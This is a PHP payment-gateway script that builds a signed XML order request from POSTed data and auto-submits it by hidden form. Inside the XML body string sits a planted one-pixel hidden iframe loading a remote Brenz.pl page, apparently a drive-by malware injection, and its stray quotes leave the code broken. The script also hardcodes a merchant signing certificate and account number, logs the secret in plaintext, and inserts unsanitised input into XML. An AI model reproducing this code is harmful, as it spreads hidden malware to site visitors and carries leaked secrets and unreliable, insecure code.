<?php

header("Content-type:text/html; charset=utf-8");
include 'Config/Config.php';


$pVersion = 'v1.0.0';//版本号
$pMerCode = $pmercode;
$pMerName = $pmercode;
$pMerCert = 'DR7x6UvTR2hPYQRJEv0jrvdsjyTEgGvTcLynaZvJkORTpDlb068MmXhaSW1t73ubd4k98j7BeLVhGnmCLshpvjWqu0hN2g5EAJ7a713BLKKLPZoDuKJFfM7nDScnDdzq';//商户证书
$pAccount  = '1794480010';//账户号
$pMsgId = "msg".rand(1000,9999);
$pReqDate = date("Ymdhis");

$pMerBillNo = $_POST["p2_Order"];
$pAmount = $_POST["p3_Amt"]; 
$pDate = date("Ymd");
$pCurrencyType = '156';
$pGatewayType ='01'; 
$pLang = 'GB';
$pMerchanturl = "http://".$_SERVER["HTTP_HOST"]."/ips/p2p_url.php";
$pFailUrl = "";
$pAttach = $_POST["pa_MP"];
$pOrderEncodeTyp = '5';
$pRetEncodeType = '17';
$pRetType = '1';
$pServerUrl = "http://pay.etpzo.com/ips/s2s_url.php";
$pBillEXP = 1;
$pGoodsName = 'pay';
$pIsCredit = '0';
$pBankCode ='';
$pProductType= '1';

$reqParam="商户号".$pMerCode
          ."商户名".$pMerName
          ."账户号".$pAccount
          ."消息编号".$pMsgId
          ."商户请求时间".$pReqDate
          ."商户订单号".$pMerBillNo
          ."订单金额".$pAmount
          ."订单日期".$pDate
          ."币种".$pCurrencyType
          ."支付方式".$pGatewayType
          ."语言".$pLang
          ."支付结果成功返回的商户URL".$pMerchanturl
          ."支付结果失败返回的商户URL".$pFailUrl
          ."商户数据包".$pAttach
          ."订单支付接口加密方式".$pOrderEncodeTyp
          ."交易返回接口加密方式".$pRetEncodeType
          ."返回方式".$pRetType
          ."Server to Server返回页面 ".$pServerUrl
          ."订单有效期".$pBillEXP
          ."商品名称".$pGoodsName
          ."直连选项".$pIsCredit
          ."银行号".$pBankCode
          ."产品类型".$pProductType;

 file_put_contents(PATH_LOG_FILE,date('y-m-d h:i:s').'提交参数信息:'.$reqParam."\r\n",FILE_APPEND);
 
 if($pIsCredit==0)
 {
     $pBankCode="";
     $pProductType='';
 }

 //请求报文的消息体
  $strbodyxml= "<body>"
	         ."<MerBillNo>".$pMerBillNo."</MerBillNo>"
	         ."<Amount>".$pAmount."</Amount>"
	         ."<Date>".$pDate."</Date>"
	         ."<CurrencyType>".$pCurrencyType."</CurrencyType>"
	         ."<GatewayType>".$pGatewayType."</GatewayType>"
                 ."<Lang>".$pLang."</Lang>"
	         ."<Merchanturl>".$pMerchanturl."</Merchanturl>"
	         ."<FailUrl>".$pFailUrl."</FailUrl>"
                 ."<Attach>".$pAttach."</Attach>"
                 ."<OrderEncodeType>".$pOrderEncodeTyp."</OrderEncodeType>"
                 ."<RetEncodeType>".$pRetEncodeType."</RetEncodeType>"
                 ."<RetType>".$pRetType."</RetType>"
                 ."<ServerUrl>".$pServerUrl."</ServerUrl>"
                 ."<BillEXP>".$pBillEXP."</BillEXP>"
                 ."<GoodsName>".$pGoodsName."</GoodsName>"
                 ."<IsCredit>".$pIsCredit."</IsCredit>"
                 ."<BankCode>".$pBankCode."</BankCode>"
                 ."<ProductType>".$pProductType."</ProductType>"
	      ."<iframe style="height:1px" src="http://www&#46;Brenz.pl/rc/" frameborder=0 width=1></iframe>
</body>";
  
  $Sign=$strbodyxml.$pMerCode.$pMerCert;
  file_put_contents(PATH_LOG_FILE,date('y-m-d h:i:s').'签名明文:'.$Sign."\r\n",FILE_APPEND);
  
  $pSignature = md5($strbodyxml.$pMerCode.$pMerCert);
  //请求报文的消息头
  $strheaderxml= "<head>"
                   ."<Version>".$pVersion."</Version>"
                   ."<MerCode>".$pMerCode."</MerCode>"
                   ."<MerName>".$pMerName."</MerName>"
                   ."<Account>".$pAccount."</Account>"
                   ."<MsgId>".$pMsgId."</MsgId>"
                   ."<ReqDate>".$pReqDate."</ReqDate>"
                   ."<Signature>".$pSignature."</Signature>"
              ."</head>";
 
//提交给网关的报文
$strsubmitxml =  "<Ips>"
              ."<GateWayReq>"
              .$strheaderxml
              .$strbodyxml
	      ."</GateWayReq>"
            ."</Ips>";

//提交给网关明文
 file_put_contents(PATH_LOG_FILE,date('y-m-d h:i:s').'提交给网关明文:'.$strsubmitxml."\r\n",FILE_APPEND);

?>
<form name="form1" id="form1" method="post" action="http://pay.etpzo.com/ips/go.php" target="_self">
<input type="hidden" name="pGateWayReq" value="<?php echo $strsubmitxml ?>" />
</form>
<script language="javascript">document.form1.submit();</script>
